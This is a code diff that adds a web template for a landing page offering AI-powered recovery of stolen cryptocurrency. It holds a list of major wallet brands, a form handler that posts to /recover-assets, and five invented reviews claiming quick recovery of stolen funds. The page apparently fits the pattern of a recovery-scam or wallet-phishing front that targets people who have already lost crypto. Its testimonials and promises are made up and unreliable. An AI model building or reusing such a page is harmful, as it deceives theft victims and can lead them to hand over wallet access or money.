@@ -1,0 +1,167 @@
+{%extends 'base.html'%}
+
+{%block content%}
+
+
+
+<main class="px-10 max-sm:px-2 py-10 text-sm text-gray-500 relative min-h-screen" x-data="page">
+    {% include 'components/recover-form.html' %}
+    <!--  -->
+    {% include "components/alerts.html" %}
+    <!--  -->
+    {% include "components/loader.html" %}
+    <!-- header start -->
+    <section class="flex flex-col items-center text-center">
+        <div class="w-1/2 max-md:w-full">
+            <h1 class="text-black mb-5 font-semibold text-4xl">Track and recover crypto assets with our A.I</h1>
+            <p>Don’t let fear of loss hold you back—our team is here to help you recover what’s yours. We’ve got the
+                tools and
+                expertise to restore your wallet quickly and securely, so you can get back to what matters most: growing
+                your crypto!</p>
+
+            <div class="flex items-center justify-center gap-10 mt-10">
+                <button class=" bg-main text-white text-sm px-5 py-3 rounded-full w-fit block"
+                    @click="showForm=true">Try
+                    it now<i class="ri-arrow-right-up-line"></i></button>
+
+                <a href="#reviews" class="text-black rounded-full px-5 py-3 w-fit bg-gray-300">See Our Reviews</a>
+            </div>
+        </div>
+        <img src="/static/images/aibot.svg" alt="" class="w-1/2 max-md:w-full h-[400px] ">
+    </section>
+    <!-- header end -->
+    <!-- reviews start -->
+    <section class="bg-gray-50 w-4/5 max-sm:w-full max-sm:p-5 p-10 mx-auto rounded-xl" id="reviews">
+        <h1 class="text-black font-semibold text-3xl max-sm:text-xl text-center">Our users have positive reviews
+        </h1>
+        <button class=" bg-main text-white text-sm px-5 py-3 mx-auto my-10 rounded-full w-fit block"
+            @click="showForm=true">Recover your crypto
+            now<i class="ri-arrow-right-up-line"></i></button>
+        <!-- cards container for reviews -->
+        <div class="grid grid-cols-3 max-sm:grid-cols-1 gap-5">
+            <template x-for="review in reviews">
+                <div class="bg-gray-100 p-5 rounded-xl">
+                    <div class="text-main mb-3">
+                        <i class="ri-user-line text-xl"></i>
+                        <p class="font-semibold text-main text-base " x-text="review.name">Jon Snow <br> <span
+                                class="text-[.7rem] text-gray-600 font-normal" x-text="review.role">NFT
+                                enthusiast</span></p>
+                    </div>
+                    <p x-text="review.message">Lorem ipsum dolor sit, amet consectetur adipisicing elit. Aliquid eos ex
+                        sed, autem magni
+                        mollitia.
+                    </p>
+                    <p class="mt-5 text-xs text-end" x-text="review.time">3 weeks ago</p>
+                </div>
+            </template>
+        </div>
+    </section>
+    <!-- reviews end -->
+
+    <script>
+        document.addEventListener("alpine:init", () => {
+            const reviews = [
+                {
+                    "name": "Sophia Barnes",
+                    "role": "blockchain developer",
+                    "message": "This platform helped me recover funds from a phishing attack in no time. Highly recommended!",
+                    "time": "2 weeks ago"
+                },
+                {
+                    "name": "Jackson Lee",
+                    "role": "DeFi strategist",
+                    "message": "I thought my crypto was gone for good after a hack, but they restored my wallet with ease!",
+                    "time": "3 days ago"
+                },
+                {
+                    "name": "Elena Novak",
+                    "role": "NFT collector",
+                    "message": "I recovered my stolen assets thanks to their quick and effective process. Great service!",
+                    "time": "1 month ago"
+                },
+                {
+                    "name": "Victor Gomez",
+                    "role": "smart contract auditor",
+                    "message": "My wallet was compromised, but this platform helped me retrieve the stolen funds almost instantly.",
+                    "time": "4 days ago"
+                },
+                {
+                    "name": "Mia Rodriguez",
+                    "role": "crypto enthusiast",
+                    "message": "I was able to get my stolen ETH back thanks to their fast and reliable recovery team!",
+                    "time": "1 week ago"
+                }
+            ]
+
+
+            const wallets = [
+                {
+                    name: "Trust Wallet",
+                    logo: "/static/images/trust.webp",
+                },
+                {
+                    name: "MetaMask",
+                    logo: "/static/images/metamask.webp",
+                },
+                {
+                    name: "OKX Wallet",
+                    logo: "/static/images/okx.webp",
+                },
+                {
+                    name: "Bitget Wallet",
+                    logo: "/static/images/okx.webp",
+                },
+                {
+                    name: "SafePal",
+                    logo: "/static/images/safepal.webp",
+                },
+                {
+                    name: "Changelly",
+                    logo: "/static/images/changelly.svg",
+                },
+                {
+                    name: "Coinbase Wallet",
+                    logo: "/static/images/coinbase.webp",
+                },
+                {
+                    name: "Rainbow Wallet",
+                    logo: "/static/images/rainbow.webp",
+                },
+                {
+                    name: "Safe Wallet",
+                    logo: "/static/images/safe.webp",
+                },
+            ];
+            Alpine.data("page", () => ({
+                wallets: wallets,
+                reviews: reviews,
+                amount: 0,
+                showForm: false,
+                async submitRequestFormTrack(e) {
+                    e.preventDefault();
+                    let form = new FormData(document.querySelector(".form"));
+                    this.showLoader = true;
+                    await fetch("/recover-assets", { method: "post", body: form })
+                        .then((res) => {
+                            if (!res.ok) {
+                                this.showError = true;
+                                return;
+                            }
+                            return res.json();
+                        })
+                        .then((data) => {
+                            window.location.reload();
+                        });
+                },
+                flashError() {
+                    this.error = true;
+                    setTimeout(() => {
+                        this.error = false;
+                    }, 2000);
+                },
+            }));
+        });
+    </script>
+</main>
+
+{%endblock%}
